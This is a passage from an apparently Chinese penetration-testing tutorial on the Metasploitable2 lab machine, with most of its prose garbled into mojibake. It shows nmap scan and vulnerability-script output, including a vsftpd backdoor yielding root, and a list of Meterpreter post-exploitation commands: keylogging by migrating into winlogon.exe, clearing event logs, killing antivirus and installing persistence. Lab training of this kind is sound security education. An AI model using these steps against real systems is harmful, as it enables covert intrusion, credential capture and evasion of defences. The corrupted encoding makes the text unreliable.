MS-RPC Shellå‘½ä»¤æ³¨å…¥æ¼æ´ç­‰ï¼Œè€Œä¸”å¯¹å¤–å¼€æ”¾äº†å¾ˆå¤šæœåŠ¡ï¼Œå¹¶ä¸”æ•°æ®åº“å…è®¸å¤–è”ç­‰ã€‚ç³»ç»Ÿä¸­çš„ç”¨æˆ·å£ä»¤å‡ä¸ºå¼±å£ä»¤ã€‚ç³»ç»Ÿæ­è½½äº†DVWAã€Mutillidaeç­‰Webæ¼æ´æ¼”ç»ƒå¹³å°\nç™»å½•é»˜è®¤è´¦å·å¯†ç ä¸ºmsfadmin:msfadmin\nç®€å•ä½“éªŒ é…ç½®å¥½é¶æœºç¯å¢ƒåï¼Œè¿›è¡Œä¿¡æ¯æ”¶é›†\nnmapè¿›è¡Œç«¯å£æ‰«æï¼š\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢] â””â”€# nmap -sT 192.168.111.136 Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:46 EDT Nmap scan report for 192.168.111.136 Host is up (0.0013s latency). Not shown: 977 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp 53/tcp open domain 80/tcp open http 111/tcp open rpcbind 139/tcp open netbios-ssn 445/tcp open microsoft-ds 512/tcp open exec 513/tcp open login 514/tcp open shell 1099/tcp open rmiregistry 1524/tcp open ingreslock 2049/tcp open nfs 2121/tcp open ccproxy-ftp 3306/tcp open mysql 5432/tcp open postgresql 5900/tcp open vnc 6000/tcp open X11 6667/tcp open irc 8009/tcp open ajp13 8180/tcp open unknown MAC Address: 00:0C:29:3B:4C:26 (VMware) ç«¯å£æœåŠ¡ç‰ˆæœ¬æ¢æµ‹ï¼š\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢] â””â”€# nmap -sV -p 1-65535 192.168.111.136 Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:47 EDT Nmap scan report for 192.168.111.136 Host is up (0.00066s latency). Not shown: 65505 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain ISC BIND 9.4.2 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) 111/tcp open rpcbind 2 (RPC #100000) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open tcpwrapped 1099/tcp open java-rmi GNU Classpath grmiregistry 1524/tcp open bindshell Metasploitable root shell 2049/tcp open nfs 2-4 (RPC #100003) 2121/tcp open ftp ProFTPD 1.3.1 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7 5900/tcp open vnc VNC (protocol 3.3) 6000/tcp open X11 (access denied) 6667/tcp open irc UnrealIRCd 6697/tcp open irc UnrealIRCd 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1 8787/tcp open drb Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb) 38340/tcp open mountd 1-3 (RPC #100005) 43194/tcp open nlockmgr 1-4 (RPC #100021) 45036/tcp open status 1 (RPC #100024) 50911/tcp open java-rmi GNU Classpath grmiregistry MAC Address: 00:0C:29:3B:4C:26 (VMware) Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 139.73 seconds æ¥ä¸‹æ¥å¯ä»¥é€šè¿‡æ¢æµ‹åˆ°çš„æ•°æ®è¿›è¡Œåˆ†æ/æœç´¢ï¼Œå¯¹å¯èƒ½å­˜åœ¨æ¼æ´çš„åœ°æ–¹è¿›è¡Œæµ‹è¯•\nä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨nmapå¯¹ä¸»æœºæˆ–ç½‘æ®µæ‰«ææ˜¯å¦å­˜åœ¨å¸¸è§çš„æ¼æ´ï¼š\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢] â””â”€# nmap --script=vuln 192.168.111.136 Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-11 08:46 EDT Host is up (0.0031s latency). Not shown: 977 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp | ftp-vsftpd-backdoor: | VULNERABLE: | vsFTPd version 2.3.4 backdoor | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2011-2523 BID:48539 | vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04. | Disclosure date: 2011-07-03 | Exploit results: | Shell command: id | Results: uid=0(root) gid=0(root) | References: | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb | https://www.securityfocus.com/bid/48539 | http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE |_sslv2-drown: ERROR: Script execution failed (use -d to debug) | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 BID:70574 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the \u0026#34;POODLE\u0026#34; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.openssl.org/~bodo/ssl-poodle.pdf | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.securityfocus.com/bid/70574 |_ https://www.imperialviolet.org/2014/10/14/poodle.html | ssl-dh-params: | VULNERABLE: | Anonymous Diffie-Hellman Key Exchange MitM Vulnerability | State: VULNERABLE | Transport Layer Security (TLS) services that use anonymous | Diffie-Hellman key exchange only provide protection against passive | eavesdropping, and are vulnerable to active man-in-the-middle attacks | which could completely compromise the confidentiality and integrity | of any data exchanged over the resulting session. | Check results: | ANONYMOUS DH GROUP 1 | Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA | Modulus Type: Safe prime | Modulus Source: postfix builtin | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: | https://www.ietf.org/rfc/rfc2246.txt | | Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam) | State: VULNERABLE | IDs: CVE:CVE-2015-4000 BID:74733 | The Transport Layer Security (TLS) protocol contains a flaw that is | triggered when handling Diffie-Hellman key exchanges defined with | the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker | to downgrade the security of a TLS session to 512-bit export-grade | cryptography, which is significantly weaker, allowing the attacker | to more easily break the encryption and monitor or tamper with | the encrypted stream. | Disclosure date: 2015-5-19 | Check results: | EXPORT-GRADE DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 512 | Generator Length: 8 | Public Key Length: 512 | References: | https://www.securityfocus.com/bid/74733 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000 | https://weakdh.org | | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA | Modulus Type: Safe prime | Modulus Source: postfix builtin | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: |_ https://weakdh.org 53/tcp open domain 80/tcp open http | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server\u0026#39;s resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_ http://ha.ckers.org/slowloris/ | http-sql-injection: | Possible sqli for queries: | http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=N%3BO%3DD%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=password-generator.php%27%20OR%20sqlspider\u0026amp;username=anonymous | http://192.168.111.136:80/mutillidae/index.php?page=usage-instructions.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=user-info.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=pen-test-tool-lookup.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=browser-info.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=home.php\u0026amp;do=toggle-security%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=login.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=captured-data.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=home.php\u0026amp;do=toggle-hints%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=dns-lookup.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=site-footer-xss-discussion.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=add-to-your-blog.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=framing.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=capture-data.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=secret-administrative-pages.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=set-background-color.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=notes.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=login.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=php-errors.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fvulnerabilities.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=show-log.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=change-log.htm%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=add-to-your-blog.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=installation.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=source-viewer.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=credits.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=arbitrary-file-inclusion.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=user-info.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=register.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=view-someones-blog.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=source-viewer.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=text-file-viewer.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=user-poll.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=home.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=html5-storage.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=credits.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=show-log.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/index.php?page=text-file-viewer.php%27%20OR%20sqlspider | http://192.168.111.136:80/mutillidae/?page=view-someones-blog.php%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider\u0026amp;rev2=1.7 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8\u0026amp;rev2=1.7%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider\u0026amp;rev2=1.9 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10\u0026amp;rev2=1.9%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider\u0026amp;rev2=1.8 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9\u0026amp;rev2=1.8%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider | http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider\u0026amp;template=oopsrev | http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10\u0026amp;template=oopsrev%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider\u0026amp;rev2=1.9 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10\u0026amp;rev2=1.9%27%20OR%20sqlspider | http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider\u0026amp;template=oopsrev | http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10\u0026amp;template=oopsrev%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider\u0026amp;rev2=1.8 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9\u0026amp;rev2=1.8%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider\u0026amp;rev2=1.7 | http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8\u0026amp;rev2=1.7%27%20OR%20sqlspider | http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=S%3BO%3DD%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=M%3BO%3DD%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=D%3BO%3DD%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider | http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider |_ http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) | http-fileupload-exploiter: | |_ Couldn\u0026#39;t find a file-type field. | http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.111.136 | Found the following possible CSRF vulnerabilities: | | Path: http://192.168.111.136:80/dvwa/ | Form id: | Form action: login.php | | Path: http://192.168.111.136:80/dvwa/login.php | Form id: | Form action: login.php | | Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html | Form id: | Form action: http://TWiki.org/cgi-bin/passwd/TWiki/WebHome | | Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html | Form id: | Form action: http://TWiki.org/cgi-bin/passwd/Main/WebHome | | Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html | Form id: | Form action: http://TWiki.org/cgi-bin/edit/TWiki/ | | Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html | Form id: | Form action: http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins | | Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html | Form id: |_ Form action: http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs |_http-dombased-xss: Couldn\u0026#39;t find any DOM based XSS. |_http-trace: TRACE is enabled |_http-stored-xss: Couldn\u0026#39;t find any stored XSS vulnerabilities. | http-enum: | /tikiwiki/: Tikiwiki | /test/: Test page | /phpinfo.php: Possible information file | /phpMyAdmin/: phpMyAdmin | /doc/: Potentially interesting directory w/ listing on \u0026#39;apache/2.2.8 (ubuntu) dav/2\u0026#39; | /icons/: Potentially interesting folder w/ directory listing |_ /index/: Potentially interesting folder 111/tcp open rpcbind 139/tcp open netbios-ssn 445/tcp open microsoft-ds 512/tcp open exec 513/tcp open login 514/tcp open shell 1099/tcp open rmiregistry | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | | References: |_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb 1524/tcp open ingreslock 2049/tcp open nfs 2121/tcp open ccproxy-ftp 3306/tcp open mysql |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug) |_ssl-ccs-injection: No reply from server (TIMEOUT) 5432/tcp open postgresql | ssl-dh-params: | VULNERABLE: | Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE | Transport Layer Security (TLS) services that use Diffie-Hellman groups | of insufficient strength, especially those using one of a few commonly | shared groups, may be susceptible to passive eavesdropping attacks. | Check results: | WEAK DH GROUP 1 | Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA | Modulus Type: Safe prime | Modulus Source: Unknown/Custom-generated | Modulus Length: 1024 | Generator Length: 8 | Public Key Length: 1024 | References: |_ https://weakdh.org | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 BID:70574 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the \u0026#34;POODLE\u0026#34; issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | https://www.openssl.org/~bodo/ssl-poodle.pdf | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.securityfocus.com/bid/70574 |_ https://www.imperialviolet.org/2014/10/14/poodle.html | ssl-ccs-injection: | VULNERABLE: | SSL/TLS MITM vulnerability (CCS Injection) | State: VULNERABLE | Risk factor: High | OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h | does not properly restrict processing of ChangeCipherSpec messages, | which allows man-in-the-middle attackers to trigger use of a zero | length master key in certain OpenSSL-to-OpenSSL communications, and | consequently hijack sessions or obtain sensitive information, via | a crafted TLS handshake, aka the \u0026#34;CCS Injection\u0026#34; vulnerability. | | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224 | http://www.openssl.org/news/secadv_20140605.txt |_ http://www.cvedetails.com/cve/2014-0224 5900/tcp open vnc 6000/tcp open X11 6667/tcp open irc |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 8009/tcp open ajp13 8180/tcp open unknown | http-cookie-flags: | /admin/: | JSESSIONID: | httponly flag not set | /admin/index.html: | JSESSIONID: | httponly flag not set | /admin/login.html: | JSESSIONID: | httponly flag not set | /admin/admin.html: | JSESSIONID: | httponly flag not set | /admin/account.html: | JSESSIONID: | httponly flag not set | /admin/admin_login.html: | JSESSIONID: | httponly flag not set | /admin/home.html: | JSESSIONID: | httponly flag not set | /admin/admin-login.html: | JSESSIONID: | httponly flag not set | /admin/adminLogin.html: | JSESSIONID: | httponly flag not set | /admin/controlpanel.html: | JSESSIONID: | httponly flag not set | /admin/cp.html: | JSESSIONID: | httponly flag not set | /admin/index.jsp: | JSESSIONID: | httponly flag not set | /admin/login.jsp: | JSESSIONID: | httponly flag not set | /admin/admin.jsp: | JSESSIONID: | httponly flag not set | /admin/home.jsp: | JSESSIONID: | httponly flag not set | /admin/controlpanel.jsp: | JSESSIONID: | httponly flag not set | /admin/admin-login.jsp: | JSESSIONID: | httponly flag not set | /admin/cp.jsp: | JSESSIONID: | httponly flag not set | /admin/account.jsp: | JSESSIONID: | httponly flag not set | /admin/admin_login.jsp: | JSESSIONID: | httponly flag not set | /admin/adminLogin.jsp: | JSESSIONID: | httponly flag not set | /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: | JSESSIONID: | httponly flag not set | /admin/includes/FCKeditor/editor/filemanager/upload/test.html: | JSESSIONID: | httponly flag not set | /admin/jscript/upload.html: | JSESSIONID: |_ httponly flag not set | http-enum: | /admin/: Possible admin folder | /admin/index.html: Possible admin folder | /admin/login.html: Possible admin folder | /admin/admin.html: Possible admin folder | /admin/account.html: Possible admin folder | /admin/admin_login.html: Possible admin folder | /admin/home.html: Possible admin folder | /admin/admin-login.html: Possible admin folder | /admin/adminLogin.html: Possible admin folder | /admin/controlpanel.html: Possible admin folder | /admin/cp.html: Possible admin folder | /admin/index.jsp: Possible admin folder | /admin/login.jsp: Possible admin folder | /admin/admin.jsp: Possible admin folder | /admin/home.jsp: Possible admin folder | /admin/controlpanel.jsp: Possible admin folder | /admin/admin-login.jsp: Possible admin folder | /admin/cp.jsp: Possible admin folder | /admin/account.jsp: Possible admin folder | /admin/admin_login.jsp: Possible admin folder | /admin/adminLogin.jsp: Possible admin folder | /manager/html/upload: Apache Tomcat (401 Unauthorized) | /manager/html: Apache Tomcat (401 Unauthorized) | /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload | /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload | /admin/jscript/upload.html: Lizard Cart/Remote File upload |_ /webdav/: Potentially interesting folder MAC Address: 00:0C:29:3B:4C:26 (VMware) Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: false |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug) Nmap done: 1 IP address (1 host up) scanned in 329.63 seconds æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¼æ´è¿›è¡Œç›¸åº”åˆ©ç”¨ï¼Œé‡å¤ªå¤šï¼Œä¸åšèµ˜è¿°\näº”ã€Meterpreter Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“\nä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpretershellçš„é“¾æ¥ã€‚Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•æ‰æŒ‰é”®ä¿¡æ¯ã€æ¸…æ¥šåº”ç”¨ç¨‹åºã€æ˜¾ç¤ºã€è¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚\nMeterpreterå¸¸ç”¨å‘½ä»¤ **backgroundï¼š**ç®€å†™ä¸ºbgï¼Œè¿”å›ï¼ŒæŠŠmeterpreteråå°æŒ‚èµ·\n**sessionsï¼š**æŸ¥çœ‹å½“å‰å»ºç«‹çš„ä¼šè¯\nsession -i [å¯¹åº”id]å¯ä»¥å›åˆ°å¯¹åº”çš„åå°è¿›ç¨‹ session -k [å¯¹åº”id]ç»“æŸè¿›ç¨‹ï¼ˆ-Kç»“æŸå…¨éƒ¨è¿›ç¨‹ï¼‰ quitï¼šé€€å‡ºä¼šè¯\npsï¼šæŸ¥çœ‹è¿›ç¨‹\ngetpidï¼šæŸ¥çœ‹å½“å‰è¿›ç¨‹å·\nsysinfoï¼šæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯\ngetsystemï¼šè‡ªåŠ¨ææƒ\nshutdownï¼šå…³æœº\nrebootï¼šé‡å¯\nnetstatï¼šæŸ¥çœ‹ç½‘ç»œè¿æ¥æƒ…å†µ\ngetuidï¼šæŸ¥çœ‹å½“å‰æƒé™\nè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼šcdã€catã€rmã€editï¼ˆä¸linuxå‘½ä»¤å·®ä¸å¤šï¼‰\nscreenshotï¼šå±å¹•æˆªå›¾\né”®ç›˜è®°å½•ï¼škeyscan_startã€keyscan_dumpã€keyscan_stop\nmigrateï¼šmigrate [å…¶ä»–è¿›ç¨‹id]ï¼Œå°†meterpreterè¿›ç¨‹è¿ç§»åˆ°å…¶ä»–è¿›ç¨‹ï¼Œä¾‹å¦‚ç³»ç»Ÿè¿›ç¨‹ï¼Œå®ç°ä¼šè¯çš„ç¨³å®š\nä¹Ÿå¯ä¸keyscané…åˆä½¿ç”¨ï¼Œä¾‹å¦‚ï¼šå°†è¿›ç¨‹è¿ç§»è‡³winlogon.exeï¼Œå†keyscan_startï¼Œå³å¯ç›‘å¬ç™»å½•è¾“å…¥å†…å®¹\nshellï¼šè¿›å…¥ç›®æ ‡shellç•Œé¢ï¼Œç”¨exité€€å‡º\narpï¼šåˆ—å‡ºç›®æ ‡ç³»ç»Ÿçš„ ARP ç¼“å­˜è¡¨ï¼Œå…¶ä¸­åŒ…æ‹¬ IP åœ°å€ã€MAC åœ°å€ä»¥åŠæ¥å£ä¿¡æ¯\nidletimeï¼š ç›®æ ‡æœåŠ¡å™¨ç©ºé—²æ—¶é—´ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦æœ‰äººæ­£åœ¨ä½¿ç”¨\nclearevï¼šæ¸…é™¤äº‹ä»¶æ—¥å¿—\nrun / bgrunï¼šè¿è¡Œmeterpreterçš„è„šæœ¬ï¼Œbgrunæ˜¯åå°è¿è¡Œ\nrun post/windows/gather/enum_applicationsï¼šæŸ¥çœ‹ç›®æ ‡ä¸»æœºå®‰è£…äº†å“ªäº›åº”ç”¨ run vncï¼šå±å¹•ç›‘æ§ run killavï¼šæ€æ­»æ€æ¯’è½¯ä»¶ run post/windows/gather/enum_computersï¼šç”¨äºæšä¸¾åŸŸå†…æ‰€æœ‰ç”¨æˆ· run persistenceï¼šæˆ‘ä»¬çŸ¥é“Meterpreterçš„å¼ºå¤§ä¹‹å¤„ä¹‹ä¸€åœ¨äºå®ƒè¿è¡Œäºå†…å­˜ä¸­ï¼Œä¸æ˜“è¢«æ€æ¯’è½¯ä»¶å‘ç°ï¼Œä½†åªè¦ç›®æ ‡æœºç¯å¢ƒåˆé€‚ï¼Œæˆ–ä½ å¯¹è‡ªå·±çš„å…æ€è¶³å¤Ÿè‡ªä¿¡ï¼Œå¯é€šè¿‡è¯¥å‘½ä»¤å†™å…¥ç¡¬ç›˜ï¼Œä¸‹æ¬¡ç›®æ ‡æœºå¯åŠ¨æ—¶ï¼Œæœ¨é©¬å°†ä¼šè‡ªå¯åŠ¨ **run scraper **ï¼šè·å–ç›®æ ‡ä¸»æœºçš„è¯¦ç»†ä¿¡æ¯ï¼ˆè·å–åˆ°çš„æ–‡ä»¶ä¿å­˜åœ¨~/.msf4/logs/scripts/scraper/è·¯å¾„ä¸‹ï¼‰ run 